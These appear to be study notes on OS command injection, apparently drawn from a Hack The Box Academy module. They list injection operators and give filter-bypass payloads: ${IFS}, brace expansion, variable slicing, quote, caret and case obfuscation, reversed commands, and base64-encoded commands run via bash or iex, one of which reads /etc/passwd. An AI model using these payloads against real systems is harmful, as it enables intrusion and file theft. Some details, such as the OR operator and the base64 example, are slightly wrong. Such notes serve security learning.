Command Injections refers to a type of vulnerability that allows us to execute a command in a way that is caused by input controlled by user is mistreated as code to be executed

The following are some of the most common types of injections:

|Injection|Description|
|---|---|
|OS Command Injection|Occurs when user input is directly used as part of an OS command.|
|Code Injection|Occurs when user input is directly within a function that evaluates code.|
|SQL Injections|Occurs when user input is directly used as part of an SQL query.|
|Cross-Site Scripting/HTML Injection|Occurs when exact user input is displayed on a web page.|

Detection:

We first would need to see a function that we can reasonably guess that a system command is executed with parameters we entered (For Example: Ping checker, which obviously takes IP address we enter then execute a ping command), if we are able to observe a change in output behavior after we perform command injection, it means that we have successfully exploited the vulnerability.

Command Injection Methods:

Below is a table of operators that can be used for command injection:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |
We need to know how each of them will perform command injection as some of them might get blocked or filtered out, more often is not up to our choice that what can be used.

Injecting Commands:

The basic of Command Injection is to use the operators above to terminate the current commands and input our commands back, for example:

```
ping -c 1 <userinput> #Example: ping -c 1 10.10.16.172
#However if the userinput is 10.10.16.172; pwd
ping -c 1 10.10.16.172; pwd
```

We can check if our payload is valid by typing command in our terminal

Usually, for user convenience, modern website will have front-end verification to assist user in using the website correctly, however in the eyes of us that equals to no verification, as with the help of burp repeater or zap, such can be easily intercepted and changed.

Depending on different type of injection, we can use different operators:

|**Injection Type**|**Operators**|
|---|---|
|SQL Injection|`'` `,` `;` `--` `/* */`|
|Command Injection|`;` `&&`|
|LDAP Injection|`*` `(` `)` `&` `\|`|
|XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
|OS Command Injection|`;` `&` `\|`|
|Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
|Object Injection|`;` `&` `\|`|
|XQuery Injection|`'` `;` `--` `/* */`|
|Shellcode Injection|`\x` `\u` `%u` `%n`|
|Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|
Bypassing filters:

Aside from getting blocked by a waf solution, our payload for command injection contains 3 part, space character, operator and a command, whenever our payload get blocked, we need to identify which part of it actually get blocked. Below will discuss how to bypass different filter.

Bypassing Space Filters:

Their are a few way to bypass Space Filters - 

-Using tabs(%09)
-Using ${IFS}, default to a space and tab at linux environment, simply replace where a space should be
-Using Bash Brace Expansion, spaces are automatically added between arguments

```
Example for Bash Brace Expansion: 127.0.0.1%0a{ls,-la}
```

Bypassing Blacklisted Characters:

Their are multiple method to bypass different blacklisted characters, depending on what character got blacklisted we have different methods for bypassing:


| Character | Bypassing Method (Linux)    | Description                                                                                                                                                                                                                                    |
| --------- | --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /         | `${PATH:0:1}`               | Path variable in linux contains directory, therefore it's first character it's usually /                                                                                                                                                       |
|           | `${HOME:0:1}`               | same method as first                                                                                                                                                                                                                           |
|           | `${PWD:0:1}`                | same method as first                                                                                                                                                                                                                           |
| ;         | <br>`${LS_COLORS:10:1}`<br> | same method as first                                                                                                                                                                                                                           |
| Generic   | `$(tr '!-}' '"-~'<<<[)`     | This method is called character shifting, the example will produce us with `\`, however we can also use it to shift other characters, just replace `[` with the character that's before it at ascii table of the character we wish to replace  |
Character Shifting Example:
```
Avalon112@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
Avalon112@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

Refer to https://academy.hackthebox.com/app/module/109/section/1037 for more detail

Bypassing command filter (OS):

There exist a few characters in linux and windows that the command interpreter will simply ignore even if they appeared in our command, we can use them to bypass command filter, pay attention to properly bypass blacklisted character when using such:


Linux and Windows:

We can add even amount of single quote or double-quotes between our commands to obfuscate it, for example:
```
wh'o'ami
w'h'o'a'mi
w"h"oami
whoa"m"i
```

Notice that we cannot mix 2 types of quote, and number of quote must be even

Linux Only:

We can add $@ or backslash to our command and it will be ignored, example:
```
who$@ami
who\am\i
```

Windows Only:

We can add a carat character in the middle of our command to obfuscate it, we can use multiple carat but none of the carat should appear continuously, Example:
```
wh^oami
w^h^oam^i
w^^hoami #This one will fail
```


Bypassing Command Filters (Advanced / WAF):

We can use some advanced techniques in attempt to bypass WAFs and other extra filtering solutions, pay attention to properly bypass blacklisted character when using such:


Case Manipulation (Window/Linux):

CMD and PowerShell does not care about the case when a command is inputted, therefore we can manipulate case to bypass command filters, Example:
```
WhOaMI
whOAMi
```

For Linux, commands are interpreted in a case sensitive manner, however, the following payload allow us to convert the manipulated command into all-lowercase words:
```
$(tr "[A-Z]" "[a-z]"<<<"<command")
```

Reversed Command (Linux Only):

We can replace our blacklisted command with the following payload to bypass filter in a reversed command manner:

```
original command | payload
whoami | $(rev<<<'imaohw')
Syntax: $(rev<<<'<reversedcommand>')
```

Encoded Command (Linux and Windows):

If subshell `$()` is not blacklisted, we can utilize it to decode encoded commands to bypass encoded filter, we can use either base64 or xxd, below is the example:
```
echo -n 'cat /etc/passwd' | base64 #or xxd if we use xxd encoding
bash<<<$(base64 -d<<<ZWNobyAtbiAnY2F0IC9ldGMvcGFzc3dkJw==) #Actual payload with previous base64 encoding
```
Windows Version:
```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
ResultingString: dwBoAG8AYQBtAGkA
(Archiving above on linux) 
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
#After getting same resulting string, the following is payload:
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

Automated Obfuscation tool:

We can use Bashfuscator to obfuscate command in linux and DOSfuscation for windows, refer to https://academy.hackthebox.com/app/module/109/section/1040 if they are actually needed